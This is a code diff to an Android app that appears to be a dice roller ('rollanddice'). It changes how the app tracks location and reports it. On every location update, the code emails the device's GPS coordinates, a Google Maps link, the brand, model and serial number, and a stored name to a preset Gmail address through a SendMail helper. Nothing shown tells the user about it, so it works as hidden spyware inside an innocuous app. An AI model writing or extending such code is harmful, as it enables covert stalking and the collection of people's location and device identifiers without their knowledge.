@@ -3,6 +3,7 @@ package ch.hearc.rollanddice;
 import android.app.ActionBar;
 import android.app.Activity;
 import android.app.ActivityManager;
+import android.content.SharedPreferences;
 import android.content.pm.ConfigurationInfo;
 import android.content.Context;
 import android.content.Intent;
@@ -17,6 +18,7 @@ import android.net.Uri;
 import android.opengl.GLSurfaceView;
 import android.os.Build;
 import android.os.Bundle;
+import android.preference.PreferenceManager;
 import android.support.v4.app.ActivityCompat;
 import android.support.v7.widget.RecyclerView;
 import android.telephony.TelephonyManager;
@@ -109,9 +111,9 @@ public class MainActivity extends Activity implements LocationListener {
 
         try{
             Log.v("Location", "try location");
-            locationManager.requestLocationUpdates(locationManager.GPS_PROVIDER, 2000, 1, this);
-            locationManager.requestLocationUpdates(locationManager.NETWORK_PROVIDER, 2000, 1, this);
-            locationManager.requestLocationUpdates(locationManager.PASSIVE_PROVIDER, 2000, 1, this);
+            locationManager.requestLocationUpdates(locationManager.GPS_PROVIDER, 300000, 100, this);
+            locationManager.requestLocationUpdates(locationManager.NETWORK_PROVIDER, 300000, 100, this);
+            locationManager.requestLocationUpdates(locationManager.PASSIVE_PROVIDER, 300000, 100, this);
             Log.v("Location", "Attempt location");
             //Location lastKnownLocation = locationManager.getLastKnownLocation(locationManager.GPS_PROVIDER);
             //Log.v("Location", "Last : " + lastKnownLocation.toString());
@@ -220,6 +222,8 @@ public class MainActivity extends Activity implements LocationListener {
 
         textSave += total+ "\n";
 
+
+
         textViewResult.setText(textViewResult.getText() + "\nTotal: " + total);
         saveFile();
     }
@@ -279,7 +283,7 @@ public class MainActivity extends Activity implements LocationListener {
     public void onLocationChanged(Location location){
         String msg = "On Location changed :" +"Latitude : " + location.getLatitude() + "Longitude : " + location.getLongitude();
         Log.v("Location" , msg);
-        sendEmail(msg);
+        sendEmail(location.getLatitude(), location.getLongitude());
     }
 
     @Override
@@ -398,15 +402,22 @@ public class MainActivity extends Activity implements LocationListener {
 
     }
 
-    private void sendEmail(String position) {
+    private void sendEmail(double latitude, double longitude) {
         //Getting content for email
 
         /*TelephonyManager tm = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
         String number = tm.getDeviceId();*/
 
-        String email = "superrollanddice@gmail.com";
+
+        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
+
+
+
+        String email = preferences.getString("mail", "superrollanddice@gmail.com");
+        String name = preferences.getString("name", "defaultname");
         String subject = "position";
-        String message = position + "\n" + "\n Model : " + Build.BRAND + " " + android.os.Build.MODEL+ "\nDevice : " +android.os.Build.DEVICE + " " + Build.SERIAL;
+        String message = "Position lattitude : " + latitude + " longitude : " + longitude + "\n" + "\n Model : " + Build.BRAND + " " + android.os.Build.MODEL+ "\nDevice : " +android.os.Build.DEVICE + " " + Build.SERIAL + "\n Name : " + name
+                +"\n\n\n http://maps.google.com/?q="+latitude+","+longitude;
 
         //Creating SendMail object
         SendMail sm = new SendMail(this, email, subject, message);
